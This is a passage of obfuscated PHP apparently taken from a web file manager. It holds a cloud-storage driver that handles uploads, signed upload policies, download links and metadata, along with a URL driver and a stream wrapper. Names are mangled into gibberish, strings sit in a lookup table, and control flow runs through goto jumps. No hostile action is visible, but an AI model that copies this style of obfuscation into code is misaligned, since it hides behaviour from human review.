$Cƒö´è©£Ñ[1316] . $A¡‹Ëìä°ñ[$Cƒö´è©£Ñ[1317]], $Cƒö´è©£Ñ[1311]); goto d±„–ªìİ’; e¼í±ÙšÕ“: $Cƒö´è©£Ñ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $a—ğÁŒÏ‹Õ = IO::size($E”­Å¸Ğ©£); if ($a—ğÁŒÏ‹Õ <= 1024 * 1024 * 200) { $EíÎñÎñ°» = array($Cƒö´è©£Ñ[1308] . $E”­Å¸Ğ©£); $BÒÈë‚Ä = $this->ussRequest($aî½öºæÃ“, $Cƒö´è©£Ñ[234], $EíÎñÎñ°»); return $BÒÈë‚Ä[$Cƒö´è©£Ñ[1046]] ? $this->getPathOuter($aî½öºæÃ“) : !1; } goto bŸß‹Çà¯Î; d±„–ªìİ’: $BÒÈë‚Ä = $this->ussRequest($aî½öºæÃ“, $Cƒö´è©£Ñ[234], !1, $bî–…‚à); return $BÒÈë‚Ä[$Cƒö´è©£Ñ[1046]] ? $this->getPathOuter($ağ°ÙàóÂ™) : !1; goto aÒ·¤˜æâ¿; bŸß‹Çà¯Î: $BìÓÚ¡Ò¹Ô = 1024 * 1024 * 10; $bî–…‚à = array($Cƒö´è©£Ñ[1309], $Cƒö´è©£Ñ[1310] . $a—ğÁŒÏ‹Õ, $Cƒö´è©£Ñ[1311], $Cƒö´è©£Ñ[1312] . $BìÓÚ¡Ò¹Ô); $BÒÈë‚Ä = $this->ussRequest($aî½öºæÃ“, $Cƒö´è©£Ñ[234], !1, $bî–…‚à); goto E‘áÎß¿¸; FÂÍ¢‘Öõ: $E…²Á‡Ç Ø = $A¡‹Ëìä°ñ[$Cƒö´è©£Ñ[1313]]; $D¼Û—·è¿ù = fopen($E”­Å¸Ğ©£, $Cƒö´è©£Ñ[1218]); if (!$D¼Û—·è¿ù) { return !1; } goto C¢È’ê»ì; aÒ·¤˜æâ¿: } private function uploadPart($e˜Î‡”Áİğ, $c©ï±µ¬ªƒ, &$e˜Øšªã“À) { $f‰ÖíÛ³ï³ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $eÁ…œÔÆË = array($f‰ÖíÛ³ï³[1318], $f‰ÖíÛ³ï³[1316] . $c©ï±µ¬ªƒ[$f‰ÖíÛ³ï³[1317]], $f‰ÖíÛ³ï³[1319] . $c©ï±µ¬ªƒ[$f‰ÖíÛ³ï³[1313]], $f‰ÖíÛ³ï³[150] . $c©ï±µ¬ªƒ[$f‰ÖíÛ³ï³[1314]]); $Eğ¼Ö¡É°” = $this->ussRequest($e˜Î‡”Áİğ, $f‰ÖíÛ³ï³[234], $e˜Øšªã“À, $eÁ…œÔÆË); return !$Eğ¼Ö¡É°”[$f‰ÖíÛ³ï³[1046]] ? $Eğ¼Ö¡É°”[$f‰ÖíÛ³ï³[1046]] : $Eğ¼Ö¡É°”[$f‰ÖíÛ³ï³[1048]]; } public function uploadFormData($F¸³Ï¬“à‡, $b×Õ‡ô®ÆÚ = 3600) { return $this->uploadPolicy($F¸³Ï¬“à‡, $b×Õ‡ô®ÆÚ); } public function multiUploadFormData($Dªïøø±Àä, $cŸç¢·ä… = 3600) { $AáïÛÌ¥½› =& $_SERVER[í¤âËÚ£¶íÊ¢]; $dÄª£‰§Ò… = (int) $GLOBALS[$AáïÛÌ¥½›[7]][$AáïÛÌ¥½›[87]]; return $this->uploadPolicy($Dªïøø±Àä, $cŸç¢·ä…, $dÄª£‰§Ò…); } private function uploadPolicy($CåõÇ‹Æ­Ü, $bå¾ŠÑ¥ªæ = 3600, $a»ÍÏİ×«ƒ = 0) { goto CÅì›É–ô ; CÅì›É–ô : $FĞ©»ÎØî =& $_SERVER[í¤âËÚ£¶íÊ¢]; $AÊŠíŠ÷Ù­ = $FĞ©»ÎØî[8] . $this->bucket; $BºÀéâ™Ç£ = gmdate($FĞ©»ÎØî[1255]); goto Bã»âÌìæå; d¬§ÄÖÈ©: $bÌáì—¾²Ú = base64_encode(hash_hmac($FĞ©»ÎØî[1290], "\x50\117\x53\124\x26{$AÊŠíŠ÷Ù­}\x26{$BºÀéâ™Ç£}\x26{$fØÂ¡¿Ú¡³}", md5("{$this->userpass}"), !0)); $dî™öå‰ = array($FĞ©»ÎØî[1159] => $fØÂ¡¿Ú¡³, $FĞ©»ÎØî[1324] => "\x55\x50\x59\125\116\x20{$this->username}\72{$bÌáì—¾²Ú}", $FĞ©»ÎØî[184] => $this->endpoint . $AÊŠíŠ÷Ù­); return $dî™öå‰; goto BŞäóÈÎ˜; Bã»âÌìæå: $b‘‡¶ĞÍŸ = array($FĞ©»ÎØî[1320] => $this->bucket, $FĞ©»ÎØî[1321] => $CåõÇ‹Æ­Ü, $FĞ©»ÎØî[1322] => time() + $bå¾ŠÑ¥ªæ, $FĞ©»ÎØî[1323] => $BºÀéâ™Ç£); if ($a»ÍÏİ×«ƒ) { $b‘‡¶ĞÍŸ[$FĞ©»ÎØî[1234]] = $a»ÍÏİ×«ƒ; } $fØÂ¡¿Ú¡³ = base64_encode(json_encode($b‘‡¶ĞÍŸ)); goto d¬§ÄÖÈ©; BŞäóÈÎ˜: } public function download($e“¬‘˜¶£, $eù¶ÛŒ¢) { goto bƒ¤” ÚÜğ; bƒ¤” ÚÜğ: $A®Ô§¸–š = IO::getPathInner(IO::mkfile($eù¶ÛŒ¢)); if (!($dÍÚ§îèïÊ = $this->link($e“¬‘˜¶£))) { return !1; } $bï­•˜èæ = 0; goto Bì‚éµŸÙ¯; eâ»Ë’‹É: fclose($F§ÓÓˆ›ì); return $eù¶ÛŒ¢; goto fè…Ÿ‡à»ã; Bì‚éµŸÙ¯: $BÓ•…Àˆ = 1024 * 200; $F§ÓÓˆ›ì = fopen($A®Ô§¸–š, $_SERVER[í¤âËÚ£¶íÊ¢][1274]); while (!0) { $b±ŒĞŞ´ºµ = $this->fileSubstr($e“¬‘˜¶£, $bï­•˜èæ, $BÓ•…Àˆ); if ($b±ŒĞŞ´ºµ === !1) { return !1; } fwrite($F§ÓÓˆ›ì, $b±ŒĞŞ´ºµ); $bï­•˜èæ += $BÓ•…Àˆ; if (strlen($b±ŒĞŞ´ºµ) < $BÓ•…Àˆ) { break; } } goto eâ»Ë’‹É; fè…Ÿ‡à»ã: } public function link($D·—ÑŠÚîä, $dßµëˆóø = array()) { $aÒò©‹áà¢ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $D·—ÑŠÚîä = trim($D·—ÑŠÚîä, $aÒò©‹áà¢[8]); if (!empty($this->token)) { $F¬ğ‘‰£Ó = strtotime(date($aÒò©‹áà¢[1325])); $aß£Ü‹ê® = substr(md5($this->token . $aÒò©‹áà¢[289] . $F¬ğ‘‰£Ó . $aÒò©‹áà¢[1326] . $D·—ÑŠÚîä), 12, 8) . $F¬ğ‘‰£Ó; $dßµëˆóø[] = $aÒò©‹áà¢[1327] . $aß£Ü‹ê®; } $EÜö‡ò¬ãï = !empty($dßµëˆóø) ? $aÒò©‹áà¢[79] . implode($aÒò©‹áà¢[289], $dßµëˆóø) : $aÒò©‹áà¢[33]; return $this->getHost() . $aÒò©‹áà¢[8] . $D·—ÑŠÚîä . $EÜö‡ò¬ãï; } public function fileOut($C‡‘Üº‘½Û, $C¹¦ªÏç‹’ = false, $f™–¸„‘²œ = false, $aá«ŒĞáÄ = '') { if ($this->isFileOutServer()) { return $this->fileOutServer($C‡‘Üº‘½Û, $C¹¦ªÏç‹’, $f™–¸„‘²œ, $aá«ŒĞáÄ); } if (!$f™–¸„‘²œ) { $f™–¸„‘²œ = $this->pathThis($C‡‘Üº‘½Û); } $Cì‹šË† = $C¹¦ªÏç‹’ ? array($_SERVER[í¤âËÚ£¶íÊ¢][1328] . rawurlencode($f™–¸„‘²œ)) : array(); $A½½ãˆ¥‘Ù = $this->link($C‡‘Üº‘½Û, $Cì‹šË†); $this->fileOutLink($A½½ãˆ¥‘Ù); } public function fileOutServer($Fêö•‚Ô˜œ, $CÍìô¢çÓé = false, $C®£ ¼£— = false, $DµÊº¢ŒÜ‰ = '') { parent::fileOut($Fêö•‚Ô˜œ, $CÍìô¢çÓé, $C®£ ¼£—, $DµÊº¢ŒÜ‰); } public function fileOutImage($eÂÊ”Ğ, $Cø™ÖÌ½¦Ã = 250) { $aƒØ›é°å­ = $this->link($eÂÊ”Ğ . $_SERVER[í¤âËÚ£¶íÊ¢][1329] . $Cø™ÖÌ½¦Ã); $this->fileOutLink($aƒØ›é°å­); } public function fileOutImageServer($fá²¦Òæîö, $cÛ˜’œ‹‚ƒ = 250) { parent::fileOutImage($fá²¦Òæîö, $cÛ˜’œ‹‚ƒ); } public function hashMd5($cö¹Ç¨®½™) { $B Î¿ùå‹î =& $_SERVER[í¤âËÚ£¶íÊ¢]; $CÃÓÓÈŸ„Ø = $this->_objectMeta($cö¹Ç¨®½™); return isset($CÃÓÓÈŸ„Ø[$B Î¿ùå‹î[216]]) ? $CÃÓÓÈŸ„Ø[$B Î¿ùå‹î[216]] : !1; } public function size($dÚÂİÀé) { $d±‡¹çœ† = $this->objectMeta($dÚÂİÀé); return $d±‡¹çœ† ? $d±‡¹çœ†[$_SERVER[í¤âËÚ£¶íÊ¢][87]] : 0; } public function info($CÙ’Ò©´–) { if ($this->isFolder($CÙ’Ò©´–)) { return $this->folderInfo($CÙ’Ò©´–); } else { if ($this->isFile($CÙ’Ò©´–)) { return $this->fileInfo($CÙ’Ò©´–); } } return !1; } public function exist($CÆÏèÎ°Ø) { return $this->isFile($CÆÏèÎ°Ø) || $this->isFolder($CÆÏèÎ°Ø); } public function isFile($D¶’ëõñŞ) { return !$this->isFolder($D¶’ëõñŞ) && $this->objectMeta($D¶’ëõñŞ); } public function isFolder($A–‡Ğ‚¶») { return $this->cacheMethod($_SERVER[í¤âËÚ£¶íÊ¢][207], $A–‡Ğ‚¶»); } protected function objectMeta($a½¿Õñ·Ÿ²) { return $this->cacheMethod($_SERVER[í¤âËÚ£¶íÊ¢][208], $a½¿Õñ·Ÿ²); } protected function _objectMeta($dä‡Ğ‚‰’) { goto fâÌ¯¥«‘; fâÌ¯¥«‘: $eÙ³„÷á‚† =& $_SERVER[í¤âËÚ£¶íÊ¢]; if ($dä‡Ğ‚‰’ == $eÙ³„÷á‚†[33] || $dä‡Ğ‚‰’ == $eÙ³„÷á‚†[8]) { return array(); } $AÄ—½µãÍ = $this->ussRequest($dä‡Ğ‚‰’, $eÙ³„÷á‚†[1330]); goto dãé…Ê…; D‹³²†¼í: $fÌ‡¸ôÚø¹ = array($eÙ³„÷á‚†[29] => isset($DŞÎĞ¯Çñö[$eÙ³„÷á‚†[1331]]) ? $DŞÎĞ¯Çñö[$eÙ³„÷á‚†[1331]] : null, $eÙ³„÷á‚†[87] => isset($DŞÎĞ¯Çñö[$eÙ³„÷á‚†[1332]]) ? $DŞÎĞ¯Çñö[$eÙ³„÷á‚†[1332]] : null, $eÙ³„÷á‚†[216] => isset($DŞÎĞ¯Çñö[$eÙ³„÷á‚†[1333]]) ? $DŞÎĞ¯Çñö[$eÙ³„÷á‚†[1333]] : null, $eÙ³„÷á‚†[1300] => isset($DŞÎĞ¯Çñö[$eÙ³„÷á‚†[1334]]) ? $DŞÎĞ¯Çñö[$eÙ³„÷á‚†[1334]] : null); $fÌ‡¸ôÚø¹[$eÙ³„÷á‚†[1301]] = isset($DŞÎĞ¯Çñö[$eÙ³„÷á‚†[1335]]) ? strtotime($DŞÎĞ¯Çñö[$eÙ³„÷á‚†[1335]]) : $fÌ‡¸ôÚø¹[$eÙ³„÷á‚†[1300]]; return $fÌ‡¸ôÚø¹; goto B¬ªÎ§’ãÏ; dãé…Ê…: if (!$AÄ—½µãÍ[$eÙ³„÷á‚†[1046]]) { return null; } $DŞÎĞ¯Çñö = isset($AÄ—½µãÍ[$eÙ³„÷á‚†[1048]]) ? $AÄ—½µãÍ[$eÙ³„÷á‚†[1048]] : array(); if (!isset($DŞÎĞ¯Çñö[$eÙ³„÷á‚†[1331]])) { return null; } goto D‹³²†¼í; B¬ªÎ§’ãÏ: } protected function _isFolder($C„¶äœ±ƒ) { $E‘æ¸¾×óõ =& $_SERVER[í¤âËÚ£¶íÊ¢]; if ($C„¶äœ±ƒ == $E‘æ¸¾×óõ[33] || $C„¶äœ±ƒ == $E‘æ¸¾×óõ[8]) { return !0; } $C÷„˜Šù§ = $this->_objectMeta($C„¶äœ±ƒ); return isset($C÷„˜Šù§[$E‘æ¸¾×óõ[29]]) && $C÷„˜Šù§[$E‘æ¸¾×óõ[29]] == $E‘æ¸¾×óõ[86] ? !0 : !1; } } class PathDriverUrl extends PathDriverBase { static $_cacheHeader = array(); public function __construct($dºİ·ì‚Íº = false) { } public function exist($DøéˆÍ”¿) { $fˆ–ÚÛíô = $this->info($DøéˆÍ”¿); return $fˆ–ÚÛíô[$_SERVER[í¤âËÚ£¶íÊ¢][203]]; } public function isFile($Dƒ©Ş®Ùò¬) { $fŞèä“Îé‰ = $this->info($Dƒ©Ş®Ùò¬); return $fŞèä“Îé‰[$_SERVER[í¤âËÚ£¶íÊ¢][203]]; } public function isFolder($a—ËŠ¬¯ĞŠ) { return !1; } public function size($BÆÎ„›ˆñ«) { $E‘à¿†Ğ² = $this->info($BÆÎ„›ˆñ«); return $E‘à¿†Ğ²[$_SERVER[í¤âËÚ£¶íÊ¢][87]]; } public function info($b §ó¾êß³) { return $this->infoParse($b §ó¾êß³); } public function infoAuth($a™éÇ·Ş…Ş) { return $this->infoParse($a™éÇ·Ş…Ş); } public function infoWithChildren($cÄê²Ÿ¶™•) { return $this->infoParse($cÄê²Ÿ¶™•); } public function infoFull($eåò®šó³ç) { return $this->infoParse($eåò®šó³ç); } private function infoParse($bÕÍÙÅé‰) { $C§ĞŠÊñ» =& $_SERVER[í¤âËÚ£¶íÊ¢]; $aõæêçÆÓÉ = $this->header($bÕÍÙÅé‰); if (!$aõæêçÆÓÉ || !$aõæêçÆÓÉ[$C§ĞŠÊñ»[694]]) { return !1; } $c÷…×íÁæ = _get($aõæêçÆÓÉ, $C§ĞŠÊñ»[342], 0); $A¿õ¿§ì’º = array($C§ĞŠÊñ»[28] => $aõæêçÆÓÉ[$C§ĞŠÊñ»[28]], $C§ĞŠÊñ»[85] => $bÕÍÙÅé‰, $C§ĞŠÊñ»[29] => $C§ĞŠÊñ»[201], $C§ĞŠÊñ»[87] => intval($c÷…×íÁæ), $C§ĞŠÊñ»[177] => get_path_ext($aõæêçÆÓÉ[$C§ĞŠÊñ»[28]]), $C§ĞŠÊñ»[1215] => $c÷…×íÁæ > 0 && $aõæêçÆÓÉ[$C§ĞŠÊñ»[1336]], $C§ĞŠÊñ»[1216] => !1); return $A¿õ¿§ì’º; } private function header($EÜ“æÅÀŸï) { goto d‡š×±óÄÂ; c‘†Ÿ¾Üœ: $GLOBALS[$cä©‚ç”ˆõ[1337]] = !0; self::$_cacheHeader[$EÜ“æÅÀŸï] = url_header($EÜ“æÅÀŸï); $GLOBALS[$cä©‚ç”ˆõ[1337]] = $Eº©¥¶Â¹; goto Aóš¤ÂÌª; Aóš¤ÂÌª: return self::$_cacheHeader[$EÜ“æÅÀŸï]; goto d ç®Ä³Ø­; d‡š×±óÄÂ: $cä©‚ç”ˆõ =& $_SERVER[í¤âËÚ£¶íÊ¢]; if (isset(self::$_cacheHeader[$EÜ“æÅÀŸï])) { return self::$_cacheHeader[$EÜ“æÅÀŸï]; } $Eº©¥¶Â¹ = isset($GLOBALS[$cä©‚ç”ˆõ[1337]]) ? $GLOBALS[$cä©‚ç”ˆõ[1337]] : !1; goto c‘†Ÿ¾Üœ; d ç®Ä³Ø­: } public function hashSimple($e‘‘–ŠÓ·Ã, $eèÉÁ½§ï¤ = false) { goto Béëœå¨³; Béëœå¨³: $dÀªÉ¥‚Š =& $_SERVER[í¤âËÚ£¶íÊ¢]; $Eà“ññä¶ƒ = $this->info($e‘‘–ŠÓ·Ã); if (!$Eà“ññä¶ƒ || !$Eà“ññä¶ƒ[$dÀªÉ¥‚Š[203]]) { return !1; } goto DÊÅ†•éİ³; DÊÅ†•éİ³: $d”Œë¯¤”ù = $Eà“ññä¶ƒ[$dÀªÉ¥‚Š[87]]; $DÒ°ÜÛ‰×¤ = 200; $BĞëÊî…øØ = 50; goto a±¢ÎÏ³; a±¢ÎÏ³: if ($d”Œë¯¤”ù <= $DÒ°ÜÛ‰×¤ * $BĞëÊî…øØ) { return md5($this->fileSubstr($e‘‘–ŠÓ·Ã, 0, $d”Œë¯¤”ù)) . $d”Œë¯¤”ù; } $D†ñÒ¬ŠÔ˜ = intval($d”Œë¯¤”ù / $BĞëÊî…øØ); $B»‹Š¦ºäà = $dÀªÉ¥‚Š[33]; goto Dê’İ®ø; Dê’İ®ø: $AÓ¹¤¾·¤™ = timeFloat(); $eÅ¢Âë¼áø = 15; for ($aÍù‚ÅÃö = 0; $aÍù‚ÅÃö < $BĞëÊî…øØ; $aÍù‚ÅÃö++) { if (timeFloat() - $AÓ¹¤¾·¤™ > $eÅ¢Âë¼áø) { return !1; } $bçª›²»ğĞ = $this->fileSubstr($e‘‘–ŠÓ·Ã, $D†ñÒ¬ŠÔ˜ * $aÍù‚ÅÃö, $DÒ°ÜÛ‰×¤); if (!$bçª›²»ğĞ) { return !1; } $B»‹Š¦ºäà .= $bçª›²»ğĞ; } goto EÈ¡Ä½Ùªö; EÈ¡Ä½Ùªö: $B»‹Š¦ºäà .= $this->fileSubstr($e‘‘–ŠÓ·Ã, $d”Œë¯¤”ù - $DÒ°ÜÛ‰×¤, $DÒ°ÜÛ‰×¤); return md5($B»‹Š¦ºäà) . $d”Œë¯¤”ù; goto FÁ¦Ì‚®œ¬; FÁ¦Ì‚®œ¬: } public function getContent($cÂöØİÕÃ) { return $this->fileSubstr($cÂöØİÕÃ); } public function fileSubstr($AÔ¤ëĞ÷‘‹, $d‰…©¢Í = 0, $F¡ÉÃÓõÊé = -1) { goto D©½­Ğæã¡; D©½­Ğæã¡: $C¾‰£¿¹óê =& $_SERVER[í¤âËÚ£¶íÊ¢]; $DÊÃã„„ñ‰ = $this->info($AÔ¤ëĞ÷‘‹); if (!$DÊÃã„„ñ‰ || !$DÊÃã„„ñ‰[$C¾‰£¿¹óê[203]] && $DÊÃã„„ñ‰[$C¾‰£¿¹óê[87]] > 1024 * 1024 * 10) { return !1; } goto d¨¹‘““¢ª; B¢Ô·ùÏÅÜ: $CÚ¬±£Ç‡Õ = url_request($AÔ¤ëĞ÷‘‹, $C¾‰£¿¹óê[236], !1, $FµÙ°’Æ—¥, !1, !1, 1); return $CÚ¬±£Ç‡Õ[$C¾‰£¿¹óê[1048]] ? $CÚ¬±£Ç‡Õ[$C¾‰£¿¹óê[1048]] : $C¾‰£¿¹óê[33]; goto f“µÒ§„â¡; d¨¹‘““¢ª: if ($F¡ÉÃÓõÊé === -1) { $F¡ÉÃÓõÊé = $DÊÃã„„ñ‰[$C¾‰£¿¹óê[87]]; } if ($F¡ÉÃÓõÊé == 0) { return $C¾‰£¿¹óê[33]; } $FµÙ°’Æ—¥ = array($C¾‰£¿¹óê[1338] . $d‰…©¢Í . $C¾‰£¿¹óê[720] . ($d‰…©¢Í + $F¡ÉÃÓõÊé - 1)); goto B¢Ô·ùÏÅÜ; f“µÒ§„â¡: } public function download($Fñ¸¥‹˜ƒÖ, $d¾˜¸¤—‡) { Downloader::start($Fñ¸¥‹˜ƒÖ, $d¾˜¸¤—‡); return $d¾˜¸¤—‡; } } class StreamWrapperIO { private $path; private $info; private $pose = 0; static $_fopenCache = array(); static $_chunkBuffer = array(); private $timeStart = 0; function stream_open($f‰¡½Â‘Ò¿, $FëŸÑßˆ× = '') { goto eÚíÙ“ó†Û; Föä­Š³Òª: $this->pathOpen = $f‰¡½Â‘Ò¿; if (!$this->info) { return !1; } if (count(self::$_chunkBuffer) > 100) { self::$_chunkBuffer = null; self::$_chunkBuffer = array(); } goto Bšß²–æò¤; Bšß²–æò¤: if (!isset(self::$_chunkBuffer[$f‰¡½Â‘Ò¿])) { self::$_chunkBuffer[$f‰¡½Â‘Ò¿] = array(); } self::$_fopenCache[$this->pathOpen] = $this; return $this->info ? !0 : !1; goto FÁ÷¢ø³î†; eÚíÙ“ó†Û: $this->info = $this->info($f‰¡½Â‘Ò¿); $this->timeStart = timeFloat(); $this->path = $this->info[$_SERVER[í¤âËÚ£¶íÊ¢][85]]; goto Föä­Š³Òª; FÁ÷¢ø³î†: } function stream_read($aİÌ§²òöµ) { $f›÷Çô¢¾ = $this->fileSubstr($this->pose, $aİÌ§²òöµ); $this->pose += strlen($f›÷Çô¢¾); return $f›÷Çô¢¾; } public function stream_tell() { return $this->pose; } public function stream_seek($bŒàÜŒ§‰Ê, $b‚Ú‹·«Ùë) { $Cç¹¹ ç´ä =& $_SERVER[í¤âËÚ£¶íÊ¢]; if ($b‚Ú‹·«Ùë == SEEK_SET) { $this->pose = $bŒàÜŒ§‰Ê; } else { if ($b‚Ú‹·«Ùë == SEEK_CUR) { $this->pose += $bŒàÜŒ§‰Ê; } else { if ($b‚Ú‹·«Ùë == SEEK_END) { $this->pose = $this->info[$Cç¹¹ ç´ä[87]] + intval($bŒàÜŒ§‰Ê); } } } if ($bŒàÜŒ§‰Ê < 0) { $this->pose = $this->info[$Cç¹¹ ç´ä[87]] + $bŒàÜŒ§‰Ê; } return !0; } public function stream_eof() { return $this->pose >= $this->info[$_SERVER[í¤âËÚ£¶íÊ¢][87]]; } public function stream_close() { unset(self::$_fopenCache[$this->pathOpen]); return !0; } public function url_stat($aˆ²±‹ê»ö, $AÀ¶„‘ÈŸ³) { $CÍŒÖµê˜ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $FÊø¦å­…Õ = $this->info($aˆ²±‹ê»ö); return array($CÍŒÖµê˜[1339] => 0, $CÍŒÖµê˜[1340] => 0, $CÍŒÖµê˜[12] => 32768 + 511, $CÍŒÖµê˜[1341] => 0, $CÍŒÖµê˜[1342] => 0, $CÍŒÖµê˜[1343] => 0, $CÍŒÖµê˜[1344] => 0, $CÍŒÖµê˜[87] => $FÊø¦å­…Õ[$CÍŒÖµê˜[87]], $CÍŒÖµê˜[1345] => $FÊø¦å­…Õ[$CÍŒÖµê˜[1214]], $CÍŒÖµê˜[1301] => $FÊø¦å­…Õ[$CÍŒÖµê˜[93]], $CÍŒÖµê˜[1300] => $FÊø¦å­…Õ[$CÍŒÖµê˜[202]], $CÍŒÖµê˜[1346] => 0, $CÍŒÖµê˜[1347] => 0); } static $fileInfo = array(); public function info($d£‰æÊ°¥§) { $cÏÃ‚ÏËåÅ = $_SERVER[í¤âËÚ£¶íÊ¢][1348]; if (isset(self::$fileInfo[$d£‰æÊ°¥§])) { return self::$fileInfo[$d£‰æÊ°¥§]; } if (substr($d£‰æÊ°¥§, 0, strlen($cÏÃ‚ÏËåÅ)) != $cÏÃ‚ÏËåÅ) { return !1; } self::$fileInfo[$d£‰æÊ°¥§] = IO::info(substr($d£‰æÊ°¥§, strlen($cÏÃ‚ÏËåÅ))); return self::$fileInfo[$d£‰æÊ°¥§]; } public static function read($eäœ·‘°, $cœ†½µ³ˆİ, $d¤¨Ë¡ñ) { if (!isset(self::$_fopenCache[$eäœ·‘°])) { $DÌ±—²©ªõ = new StreamWrapperIO(); $DÌ±—²©ªõ->stream_open($eäœ·‘°); self::$_fopenCache[$eäœ·‘°] = $DÌ±—²©ªõ; } $DÌ±—²©ªõ = self::$_fopenCache[$eäœ·‘°]; return $DÌ±—²©ªõ->fileSubstr($cœ†½µ³ˆİ, $d¤¨Ë¡ñ); } public static function _read($Cà”ĞÈõ®Ì, $b‡ˆ†ªèß , $cØ«»¥¼˜¨) { goto E‚ÄáßŒ §; C‰åÏÌç: $fĞ¡ìÙ‚“š = 8192; fseek($b¶®ÖŠö°“, $b‡ˆ†ªèß , SEEK_SET); $FÈ½®‚ö¬ = $A®©İÁ¬ã[33]; goto aäƒõ¢î•; cäâÀØ„—š: return $FÈ½®‚ö¬; goto d«Š„Ó; aäƒõ¢î•: $EØÉášñ¬Ë = 0; while ($EØÉášñ¬Ë < $cØ«»¥¼˜¨) { $F™Äì«…ºº = min($fĞ¡ìÙ‚“š, $cØ«»¥¼˜¨ - $EØÉášñ¬Ë); $FÈ½®‚ö¬ .= fread($b¶®ÖŠö°“, $F™Äì«…ºº); $EØÉášñ¬Ë += $F™Äì«…ºº; } fclose($b¶®ÖŠö°“); goto cäâÀØ„—š; E‚ÄáßŒ §: $A®©İÁ¬ã =& $_SERVER[í¤âËÚ£¶íÊ¢]; $b¶®ÖŠö°“ = fopen($Cà”ĞÈõ®Ì, $A®©İÁ¬ã[1218]); if (!$b¶®ÖŠö°“) { return $A®©İÁ¬ã[33]; } goto C‰åÏÌç; d«Š„Ó: } public function fileSubstr($C¶£…ÖíÌ°, $dÁÚØ¥‹êÖ) { goto d¯Úã…²¢œ; D°ÏÀÎ¼Ô: ksort($cÚäëóåá•); $Dì„ÕƒìŸ = substr($c·°¹‰ƒâ, $C¶£…ÖíÌ° - $FÁÆÛÕ¶áì, $dÁÚØ¥‹êÖ); return $Dì„ÕƒìŸ; goto AÉ¨¥“ˆ¨; aœ«ŠÆù: $Dò××ƒÙ¾â = $dÁÚØ¥‹êÖ; if ($C¶£…ÖíÌ° < 0) { $C¶£…ÖíÌ° = $eÀ¯ÛÈğçÑ + $C¶£…ÖíÌ°; } if ($dÁÚØ¥‹êÖ === !1) { $dÁÚØ¥‹êÖ = $eÀ¯ÛÈğçÑ - $C¶£…ÖíÌ°; } goto dáÌ‰ÍªÛ; dáÌ‰ÍªÛ: if ($C¶£…ÖíÌ° + $dÁÚØ¥‹êÖ > $eÀ¯ÛÈğçÑ) { $dÁÚØ¥‹êÖ = $eÀ¯ÛÈğçÑ - $C¶£…ÖíÌ°; } if ($dÁÚØ¥‹êÖ <= 0) { return $D…»Äù…ô[33]; } if ($C¶£…ÖíÌ° < 0 || $C¶£…ÖíÌ° >= $eÀ¯ÛÈğçÑ || $dÁÚØ¥‹êÖ <= 0 || $dÁÚØ¥‹êÖ > 1024 * 1024 * 5) { throw new Exception("\151\157\x46\151\x6c\x65\x52\x65\x61\x64\40\x65\162\162\157\162\41\x20\x73\x74\141\162\164\x3d{$C¶£…ÖíÌ°}\73\154\x65\x6e\147\x74\x68\x3d{$dÁÚØ¥‹êÖ}\x3b\x20\x73\151\172\x65\x3d{$eÀ¯ÛÈğçÑ}\73"); } goto A¨«×Üõƒ”; A¨«×Üõƒ”: $d¸ˆÈùõ–Œ = 64 * 1024; $cÚäëóåá• =& self::$_chunkBuffer[$this->path]; if (!$cÚäëóåá•) { $cÚäëóåá• = array(); } goto A¦‘ÇñåñŠ; d¯Úã…²¢œ: $D…»Äù…ô =& $_SERVER[í¤âËÚ£¶íÊ¢]; $eÀ¯ÛÈğçÑ = $this->info[$D…»Äù…ô[87]]; $eœ·ŒîØ = $C¶£…ÖíÌ°; goto aœ«ŠÆù; BÏØã¡’›: $EÀ–Õ’´™ = ceil(($C¶£…ÖíÌ° + $dÁÚØ¥‹êÖ) / $d¸ˆÈùõ–Œ) * $d¸ˆÈùõ–Œ - $FÁÆÛÕ¶áì; $c·°¹‰ƒâ = IO::fileSubstr($this->path, $FÁÆÛÕ¶áì, $EÀ–Õ’´™); $cÚäëóåá•[$FÁÆÛÕ¶áì . $D…»Äù…ô[33]] = $c·°¹‰ƒâ; goto D°ÏÀÎ¼Ô; A¦‘ÇñåñŠ: $c¯Õò·¨Üó = 0; $c¨Õğ‘”öƒ = 0; $c«™…ŒŞ–œ = $D…»Äù…ô[33]; goto d»ƒéÅ…¿¼; d»ƒéÅ…¿¼: foreach ($cÚäëóåá• as $c¯Õò·¨Üó => $c«™…ŒŞ–œ) { $c¯Õò·¨Üó = intval($c¯Õò·¨Üó); $c¨Õğ‘”öƒ = $c¯Õò·¨Üó + strlen($c«™…ŒŞ–œ); if ($C¶£…ÖíÌ° >= $c¨Õğ‘”öƒ) { continue; } if ($C¶£…ÖíÌ° >= $c¯Õò·¨Üó && $C¶£…ÖíÌ° + $dÁÚØ¥‹êÖ <= $c¨Õğ‘”öƒ) { return substr($c«™…ŒŞ–œ, $C¶£…ÖíÌ° - $c¯Õò·¨Üó, $dÁÚØ¥‹êÖ); } break; } if (count($cÚäëóåá•) > 100 || timeFloat() - $this->timeStart > 2.0) { $this->log($D…»Äù…ô[1349], $D…»Äù…ô[1350] . count($cÚäëóåá•) . "\73\163\164\x61\x72\x74\75{$C¶£…ÖíÌ°}\x2c\154\x65\x6e\147\164\150\75{$dÁÚØ¥‹êÖ}\73\x70\x6f\163\145\72{$c¯Õò·¨Üó}\176{$c¨Õğ‘”öƒ}"); throw new Exception($D…»Äù…ô[1351]); } $FÁÆÛÕ¶áì = intval($C¶£…ÖíÌ° / $d¸ˆÈùõ–Œ) * $d¸ˆÈùõ–Œ; goto BÏØã¡’›; AÉ¨¥“ˆ¨: } private function log($f˜ì”†Ÿ÷, $BÇÔÈŒ²Ó) { $Aáº×Ø¸Ù° =& $_SERVER[í¤âËÚ£¶íÊ¢]; $AÂìãÑãÚ£ = timeFloat() - $this->timeStart; write_log(sprintf($Aáº×Ø¸Ù°[1352], $f˜ì”†Ÿ÷, $this->info[$Aáº×Ø¸Ù°[28]], $AÂìãÑãÚ£, $BÇÔÈŒ²Ó), $Aáº×Ø¸Ù°[1038]); } } goto eºÕïë¸ÑÆ; eºÕïë¸ÑÆ: class Message { function __construct() { } public function send($Fî©ß†®º” = '', $a©Øõ¤ô‘ = array(), $D¶Õ‹‚³¯ = "\x74\145\x78\164") { goto F½›Ó÷¹á‹; dÎë¸‘Ã£é: Hook::trigger($B¼íğ¿Ğæ[1356], $cÕÙˆ—ÒÏ³); goto f±öƒª‡©§; 